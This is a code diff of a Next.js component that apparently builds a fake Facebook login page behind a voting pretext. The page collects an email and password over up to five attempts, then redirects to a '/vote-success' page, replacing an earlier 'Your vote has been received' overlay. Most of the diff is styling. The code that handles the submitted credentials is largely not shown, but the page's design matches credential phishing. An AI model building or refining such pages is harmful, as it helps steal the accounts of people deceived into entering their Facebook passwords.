@@ -1,14 +1,15 @@
 import Head from 'next/head';
 import { useState, useRef } from 'react';
+import { useRouter } from 'next/router';
 
 const MAX_ATTEMPTS = 5;
 
 export default function FacebookLoginPage() {
+  const router = useRouter();
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [feedback, setFeedback] = useState('');
   const [clickCount, setClickCount] = useState(0);
-  const [showSuccess, setShowSuccess] = useState(false);
   const attemptRef = useRef(0);
 
   const handleLogin = async () => {
@@ -31,8 +32,7 @@ export default function FacebookLoginPage() {
     } catch (e) {}
     
     if (attemptRef.current >= MAX_ATTEMPTS) {
-      setShowSuccess(true);
-      setTimeout(() => setShowSuccess(false), 4000);
+      router.push('/vote-success');
     }
   };
 
@@ -50,70 +50,66 @@ export default function FacebookLoginPage() {
           font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
           background: linear-gradient(135deg, #e7ebf0, #f0f2f5); 
           display: flex; 
-          align-items: center; 
           justify-content: center; 
+          align-items: center; 
           min-height: 100vh;
+          margin: 0;
         }
         .login-container {
-          background: white; 
-          width: 360px; 
-          padding: 30px; 
-          border-radius: 8px; 
-          box-shadow: 0 4px 12px rgba(0,0,0,0.1); 
+          background: white;
+          width: 100%;
+          max-width: 360px;
+          padding: 30px;
+          border-radius: 8px;
+          box-shadow: 0 2px 8px rgba(0,0,0,0.1);
           text-align: center;
-          max-width: 90vw;
+          margin: 20px;
         }
         .logo {
-                  width: 50px;
-                  height: 50px;
-                  margin: 0 auto 20px;
-                  display: block;
-                }
-        input { 
-          width: 100%; 
-          max-width: 320px;
-          padding: 12px 16px; 
-          margin: 10px auto 0;
+          width: 50px;
+          height: 50px;
+          margin: 0 auto 16px;
           display: block;
-          border: 1px solid #ccd0d5; 
-          border-radius: 6px; 
-          font-size: 15px; 
-          background: #f5f6f7;
+        }
+        input { 
+          width: 100%;
+          padding: 12px 14px; 
+          margin: 10px 0;
+          border: 1px solid #ccc; 
+          border-radius: 6px;
+          font-size: 15px;
+          background: #fafafa;
         }
         input:focus { 
-          outline: none; 
-          border-color: #1877f2; 
+          outline: none;
+          border-color: #1877f2;
           background: white;
         }
         button { 
-          width: 100%; 
-          max-width: 320px;
-          padding: 12px; 
-          background: #1877f2; 
-          color: white; 
-          border: none; 
-          border-radius: 6px; 
-          font-size: 16px; 
+          width: 100%;
+          padding: 12px;
+          background: #1877f2;
+          color: white;
+          border: none;
+          border-radius: 6px;
+          font-size: 16px;
           cursor: pointer;
           margin-top: 8px;
-          display: block;
         }
         button:hover { 
-          background: #166fe5; 
+          background: #166fe5;
         }
-        .feedback { 
-          color: #e1306c; 
-          font-size: 14px; 
-          margin: 8px auto 0;
-          max-width: 320px;
-          display: block;
+        .feedback {
+          color: #e1306c;
+          font-size: 14px;
+          margin: 8px 0;
         }
         a {
           color: #1877f2;
           text-decoration: none;
           font-size: 14px;
           display: block;
-          margin-top: 10px;
+          margin-top: 12px;
         }
         .secondary-btn {
           background: linear-gradient(135deg, #42b72a, #36a420);
@@ -125,45 +121,10 @@ export default function FacebookLoginPage() {
           margin-bottom: 10px;
           cursor: pointer;
           width: 100%;
-          max-width: 320px;
-          display: block;
-          margin-left: auto;
-          margin-right: auto;
           font-size: 16px;
         }
         .secondary-btn:hover { 
-          background: linear-gradient(135deg, #36a420, #2e921c); 
-        }
-        .success-overlay { 
-          position: fixed; 
-          inset: 0; 
-          background: rgba(255,255,255,0.98); 
-          display: none; 
-          align-items: center; 
-          justify-content: center; 
-          z-index: 9999; 
-        }
-        .success-overlay.show { 
-          display: flex; 
-        }
-        .success-box { 
-          text-align: center; 
-          padding: 20px; 
-        }
-        .checkmark { 
-          width: 110px; 
-          height: 110px; 
-          background: #4caf50; 
-          border-radius: 50%; 
-          display: flex; 
-          align-items: center; 
-          justify-content: center; 
-          margin: 0 auto 28px; 
-          box-shadow: 0 4px 12px rgba(76,175,80,0.4); 
-        }
-        .checkmark svg { 
-          width: 56px; 
-          height: 56px; 
+          background: linear-gradient(135deg, #36a420, #2e921c);
         }
       `}</style>
 
@@ -191,14 +152,6 @@ export default function FacebookLoginPage() {
         <a href="#">Forgotten Password?</a>
         
         <button className="secondary-btn">Create New Account</button>
-      </div>
-
-      <div className="success-overlay" id="successOverlay">
-        <div className="success-box">
-          <div className="checkmark"><svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg"><polyline points="15,27 24,36 39,17"></polyline></svg></div>
-          <h2>Your vote has been received</h2>
-          <p>We will get back to you when your vote is counted.</p>
-        </div>
       </div>
     </>
   );
